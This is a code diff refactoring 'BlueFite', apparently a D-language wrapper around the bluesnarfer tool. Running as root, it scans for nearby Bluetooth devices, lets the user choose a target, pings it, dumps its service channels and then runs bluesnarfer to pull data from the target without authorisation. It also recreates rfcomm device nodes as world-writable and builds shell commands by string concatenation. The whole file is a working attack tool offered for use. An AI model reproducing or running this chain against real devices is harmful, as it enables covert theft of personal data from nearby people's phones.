@@ -7,60 +7,65 @@ import core.thread;
 import core.time;
 import core.stdc.stdlib;
 
-int RFCOMM = 0, TEST = 1, SCAN = 2, PING = 3, DUMP = 4, EXEC = 5, STAGE = 0;
+enum Stages {
+	RFCOMM, TEST, SCAN, PING, DUMP, EXEC
+}
+int stage;
 string TARGET_BT_MAC = "";
 int TARGET_BT_CHAN = 0;
+const string FAIL = "[\033[1;31mFAIL\033[0m]";
+const string OK = "[\033[1;32mOK\033[0m]";
 
 void main(string[] args){
 	writeln("\033[1;7;36m :::BlueFite::: \n\033[1;27;36mBinary wrapper by Sonic, original script by Sid \"Pahakir228\" Jaresky\033[0m");
-	
+
 	writeln(":: running priviledge check...");
 	string otp = executeShell("id -u").output.chop();
 	if(otp != "0") {
-		writeln(":: [\033[1;31mFAIL\033[0m] priviledge check");
+		writefln(":: %s priviledge check", FAIL);
 		writeln("This program must be run with superuser priviledges!");
-		exit (-1);
-		
+		exit(-1);
 	}
+
 	Thread.sleep(dur!"seconds"(1));
-	writeln(":: [\033[1;32mOK\033[0m] priviledge check");
+	writefln(":: %s priviledge check", OK);
 	Thread.sleep(dur!"seconds"(1));
-	
+
 	writeln(":: setting up rfcomm (prep stage 0)...");
-	STAGE = RFCOMM;
-	bool ret = setup(RFCOMM);
+	stage = Stages.RFCOMM;
+	bool ret = setup(Stages.RFCOMM);
 	if(!ret) emext();
 	Thread.sleep(dur!"seconds"(1));
-	writeln(":: [\033[1;32mOK\033[0m] stage 0");
+	writefln(":: %s stage 0", OK);
 
 	writeln(":: running test (prep stage 1)...");
-	STAGE = TEST;
-	ret = setup(TEST);
+	stage = Stages.TEST;
+	ret = setup(Stages.TEST);
 	if(!ret) emext();
-	writeln(":: [\033[1;32mOK\033[0m] stage 1");
+	writefln(":: %s stage 1", OK);
 
 	writeln(":: running scan (work stage 2)...");
-	STAGE = SCAN;
-	ret = setup(SCAN);
+	stage = Stages.SCAN;
+	ret = setup(Stages.SCAN);
 	if(!ret) emext();
-	writeln(":: [\033[1;32mOK\033[0m] stage 2");
+	writefln(":: %s stage 2", OK);
 
 	writeln(":: pinging target (work stage 3)...");
-	STAGE = PING;
-	ret = setup(PING);
+	stage = Stages.PING;
+	ret = setup(Stages.PING);
 	if(!ret) emext();
-	writeln(":: [\033[1;32mOK\033[0m] stage 3");
-	
+	writefln(":: %s stage 3", OK);
+
 	writeln(":: dumping channels (work stage 4)...");
-	STAGE = DUMP;
-	ret = setup(DUMP);
+	stage = Stages.DUMP;
+	ret = setup(Stages.DUMP);
 	if(!ret) emext();
-	writeln(":: [\033[1;32mOK\033[0m] stage 4");
-	
+	writefln(":: %s stage 4", OK);
+
 	writeln(":: executing...");
-	STAGE = EXEC;
-	ret = setup(EXEC);
-	if(ret) 
+	stage = Stages.EXEC;
+	ret = setup(Stages.EXEC);
+	if(ret)
 		writeln("\033[1;32mFIN\033[0m");
 	else
 		writeln("\033[1;31mFIN\033[0m");
@@ -68,9 +73,9 @@ void main(string[] args){
 }
 
 void emext(){
-	writeln(":: [\033[1;31mFAIL\033[0m] stage " ~ to!string(STAGE));
+	writefln(":: %s stage %d", FAIL, stage);
 	writeln("Error occured while running stage!");
-	exit(STAGE);
+	exit(stage);
 }
 
 void rext(){
@@ -79,9 +84,8 @@ void rext(){
 }
 
 bool setup(int stage){
-	bool res = false;
 	switch(stage) {
-		case 0:
+		case Stages.RFCOMM:
 			int stat = 0;
 			stat += executeShell("hciconfig -a hci0 down").status;
 			stat += executeShell("rm -rf /dev/bluetooth/rfcomm").status;
@@ -90,29 +94,20 @@ bool setup(int stage){
 			stat += executeShell("mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0").status;
 			stat += executeShell("mknod --mode=666 /dev/rfcomm0 c 216 0").status;
 			stat += executeShell("hciconfig -a hci0 up").status;
-			if(stat != 0) res = false;
-			else res = true;
-		break;
-		case 1:
+			return stat == 0;
+		case Stages.TEST:
 			auto p = executeShell("hciconfig hci0");
-			string outp = p.output;
-			int code = p.status;
-			if(code != 0) res = false;
-			else {
-				writeln(outp);
-				res = true;
-			}
-		break;
-		case 2:
+			if(p.status != 0) return false;
+			writeln(p.output);
+			return true;
+		case Stages.SCAN:
 			auto p = executeShell("hcitool scan");
 			string output = p.output;
 			string[] targets;
-			
+
 			if(output.length < 18){
-				res = false;
 				writeln("Couldn't find any targets :(");
 				rext();
-				break;
 			}
 			if(output.indexOf("\n") == -1)
 				targets = [output];
@@ -137,32 +132,25 @@ bool setup(int stage){
 			}
 			if(num >= i || num < 0) {
 				writeln(":: [\033[1;31mX\033[0m] No target with such number!");
-				res = false;
-				break;
+				return false;
 			}
 			TARGET_BT_MAC = targ_list[num][1..18];
 			writeln(":: proceeding for mac '" ~ TARGET_BT_MAC ~ "'");
-			res = true;
-		break;
-		case 3:
-			auto pipe = pipe();
+			return true;
+		case Stages.PING:
 			auto p = executeShell("l2ping -c 2 " ~ TARGET_BT_MAC);
 			int result = p.status;
-			
+
 			foreach(string s; p.output.chop().split("\n")){
 				if(s == "Can't connect: Host is down"){
 					writeln(":: can't connect: host is down");
 					emext();
 				}
 			}
-			
-			if(result != 0) {
-				res = false;
-				break;
-			}
-			res = true;
-		break;
-		case 4:
+
+			if(result != 0) return false;
+			return true;
+		case Stages.DUMP:
 			auto p = executeShell("sdptool browse " ~ TARGET_BT_MAC);
 			string output = p.output;
 			string lines_construct = ":: select channel:\n";
@@ -192,14 +180,11 @@ bool setup(int stage){
 					emext();
 				}
 			}
-			res = true;
-		break;
-		case 5:
+			return true;
+		case Stages.EXEC:
 			auto p = executeShell("bluesnarfer -b -C " ~ to!string(TARGET_BT_CHAN) ~ " " ~ TARGET_BT_MAC ~ " -i");
 			writeln("\n:: bluesnarfer says:\n" ~ p.output);
-			res = (p.status == 0);
-		break;
-		default: break;
+			return p.status == 0;
+		default: assert(0);
 	}
-	return res;
 }
